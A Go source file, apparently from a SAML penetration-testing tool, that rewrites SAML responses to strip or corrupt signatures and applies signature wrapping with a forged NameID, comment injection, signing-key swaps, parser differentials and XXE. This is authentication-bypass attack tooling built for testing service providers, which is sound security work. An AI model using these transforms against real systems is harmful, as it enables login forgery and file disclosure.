package saml

import (
	"encoding/base64"
	"fmt"
	"log/slog"
	"strings"

	"github.com/beevik/etree"
)

func TransformSAMLResponse(samlResponseB64 string, config *TamperConfig, logger *slog.Logger) (string, []TamperModification, error) {
	config.mu.RLock()
	sigMode := config.SignatureMode
	xswVariant := config.XSWVariant
	xswNameID := config.XSWNameID
	xxeEnabled := config.XXEEnabled
	xxeType := config.XXEType
	xxeTarget := config.XXETarget
	xxePlacement := config.XXEPlacement
	xxeCustom := config.XXECustom
	commentInjection := config.CommentInjection
	commentPosition := config.CommentPosition
	signKeyMode := config.SignKeyMode
	parserDiffMode := config.ParserDiffMode
	resigner := config.resigner
	differ := config.differ
	config.mu.RUnlock()

	xmlBytes, err := base64.StdEncoding.DecodeString(samlResponseB64)
	if err != nil {
		return "", nil, fmt.Errorf("transform: base64 decode failed: %w", err)
	}

	var mods []TamperModification

	if IsEncryptedAssertion(xmlBytes) {
		// These transforms rewrite the assertion XML, which is unreachable once
		// the library has encrypted it for the SP. Record the skip so it shows
		// up in the inspector instead of only in the log.
		if xswVariant != "" {
			logger.Warn("skipping XSW: assertion is encrypted", "variant", xswVariant)
			mods = append(mods, TamperModification{
				Field:    "XSW",
				OldValue: xswVariant,
				NewValue: SkippedEncryptedNote,
			})
			xswVariant = ""
		}
		if commentInjection {
			logger.Warn("skipping comment injection: assertion is encrypted")
			mods = append(mods, TamperModification{
				Field:    "Comment Injection",
				OldValue: "requested",
				NewValue: SkippedEncryptedNote,
			})
			commentInjection = false
		}
		if signKeyMode != "" {
			// The assertion signature is sealed inside EncryptedAssertion, so
			// there is nothing left to re-sign or to swap a KeyInfo on.
			logger.Warn("skipping signing key attack: assertion is encrypted", "mode", signKeyMode)
			mods = append(mods, TamperModification{
				Field:    "Signing Key",
				OldValue: signKeyMode,
				NewValue: SkippedEncryptedNote,
			})
			signKeyMode = ""
		}
		if parserDiffMode != "" {
			// Every parser differential mode rewrites the assertion and the ID
			// relationships around it, and the forged claim the probe depends on
			// lives inside the assertion, sealed in EncryptedAssertion.
			logger.Warn("skipping parser differential attack: assertion is encrypted", "mode", parserDiffMode)
			mods = append(mods, TamperModification{
				Field:    "Parser Differential",
				OldValue: parserDiffMode,
				NewValue: SkippedEncryptedNote,
			})
			parserDiffMode = ""
		}
	}

	// The signing key attack runs first so that everything after it operates
	// on the response as the attacker signed it. Running it last would resign
	// over an XSW wrapper, covering the wrapper instead of the wrapped element.
	if signKeyMode != "" {
		if resigner == nil {
			return "", nil, fmt.Errorf("transform: signing key attack requested without key material")
		}
		transformed, desc, err := resigner.Apply(xmlBytes, signKeyMode)
		if err != nil {
			return "", nil, fmt.Errorf("transform: signing key attack failed: %w", err)
		}
		xmlBytes = transformed
		mods = append(mods, TamperModification{
			Field:    "Signing Key",
			OldValue: "idp key",
			NewValue: desc,
		})
	}

	// Parser differentials run after the signing key attack so that the two
	// compose: the key attack decides which certificate signs, this decides
	// which element the SP believes was signed. Running it first would let the
	// resigner recompute the digest over the polluted shape and dissolve the
	// ID-to-Reference relationship the attack depends on.
	if parserDiffMode != "" {
		if differ == nil {
			return "", nil, fmt.Errorf("transform: parser differential attack requested without key material")
		}
		transformed, desc, err := differ.Apply(xmlBytes, parserDiffMode)
		if err != nil {
			return "", nil, fmt.Errorf("transform: parser differential attack failed: %w", err)
		}
		xmlBytes = transformed
		mods = append(mods, TamperModification{
			Field:    "Parser Differential",
			OldValue: "well-formed response",
			NewValue: desc,
		})
	}

	if sigMode != "" {
		xmlBytes, err = applySignatureMode(xmlBytes, sigMode)
		if err != nil {
			return "", nil, fmt.Errorf("transform: signature mode failed: %w", err)
		}
		mods = append(mods, TamperModification{
			Field:    "Signature",
			OldValue: "present",
			NewValue: "mode: " + sigMode,
		})
	}

	if xswVariant != "" {
		xmlBytes, err = ApplyXSW(xmlBytes, xswVariant, xswNameID)
		if err != nil {
			return "", nil, fmt.Errorf("transform: XSW failed: %w", err)
		}
		mods = append(mods, TamperModification{
			Field:    "XSW",
			OldValue: "none",
			NewValue: xswVariant + " (evil NameID: " + xswNameID + ")",
		})
	}

	if commentInjection {
		xmlBytes, err = ApplyCommentInjection(xmlBytes, commentPosition)
		if err != nil {
			return "", nil, fmt.Errorf("transform: comment injection failed: %w", err)
		}
		mods = append(mods, TamperModification{
			Field:    "Comment Injection",
			OldValue: "none",
			NewValue: fmt.Sprintf("injected at position %d", commentPosition),
		})
	}

	// Both a DOCTYPE-based parser differential and the XXE mode prepend a
	// DOCTYPE, and a document may carry only one. etree will not catch the
	// duplicate for us, so drop XXE: the parser differential is the mode the
	// operator selected as the primary attack and it has already run.
	if xxeEnabled && ParserDiffUsesDoctype(parserDiffMode) {
		logger.Warn("skipping XXE: parser differential mode already prepends a DOCTYPE", "mode", parserDiffMode)
		mods = append(mods, TamperModification{
			Field:    "XXE",
			OldValue: xxeType,
			NewValue: SkippedDoctypeConflictNote,
		})
		xxeEnabled = false
	}

	if xxeEnabled {
		xmlBytes, err = ApplyXXE(xmlBytes, xxeType, xxeTarget, xxePlacement, xxeCustom)
		if err != nil {
			return "", nil, fmt.Errorf("transform: XXE failed: %w", err)
		}
		mods = append(mods, TamperModification{
			Field:    "XXE",
			OldValue: "none",
			NewValue: xxeType + " (" + xxeTarget + ")",
		})
	}

	encoded := base64.StdEncoding.EncodeToString(xmlBytes)
	return encoded, mods, nil
}

// SkippedEncryptedNote explains, in the inspector and the preview pane, why a
// transform that needs plaintext XML did not run.
const SkippedEncryptedNote = `skipped - assertion is encrypted (enable "Send assertion unencrypted")`

// SkippedDoctypeConflictNote explains why XXE did not run alongside a
// DOCTYPE-based parser differential mode.
const SkippedDoctypeConflictNote = `skipped - the parser differential mode already prepends a DOCTYPE and a document may only have one`

// IsEncryptedAssertion reports whether a SAML response carries its assertion
// encrypted, in which case the assertion XML cannot be rewritten.
func IsEncryptedAssertion(xmlBytes []byte) bool {
	return strings.Contains(string(xmlBytes), "<saml:EncryptedAssertion") ||
		strings.Contains(string(xmlBytes), "<EncryptedAssertion")
}

func applySignatureMode(xmlBytes []byte, mode string) ([]byte, error) {
	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(xmlBytes); err != nil {
		return nil, fmt.Errorf("signature mode: parse failed: %w", err)
	}

	response := doc.Root()
	if response == nil {
		return nil, fmt.Errorf("signature mode: no root element")
	}

	assertion := findElement(response, "saml", "Assertion")

	switch mode {
	case "remove_response":
		removeSignature(response)
	case "remove_both":
		removeSignature(response)
		if assertion != nil {
			removeSignature(assertion)
		}
	case "empty_value":
		emptySigValue(response)
		if assertion != nil {
			emptySigValue(assertion)
		}
	case "invalid_digest":
		corruptDigest(response)
		if assertion != nil {
			corruptDigest(assertion)
		}
	default:
		return nil, fmt.Errorf("signature mode: unknown mode %q", mode)
	}

	return doc.WriteToBytes()
}

func emptySigValue(el *etree.Element) {
	sig := findSignature(el)
	if sig == nil {
		return
	}
	sigValue := findElement(sig, "ds", "SignatureValue")
	if sigValue != nil {
		sigValue.SetText("")
	}
}

func corruptDigest(el *etree.Element) {
	sig := findSignature(el)
	if sig == nil {
		return
	}
	signedInfo := findElement(sig, "ds", "SignedInfo")
	if signedInfo == nil {
		return
	}
	ref := findElement(signedInfo, "ds", "Reference")
	if ref == nil {
		return
	}
	digestValue := findElement(ref, "ds", "DigestValue")
	if digestValue != nil {
		digestValue.SetText("AAAA" + digestValue.Text())
	}
}
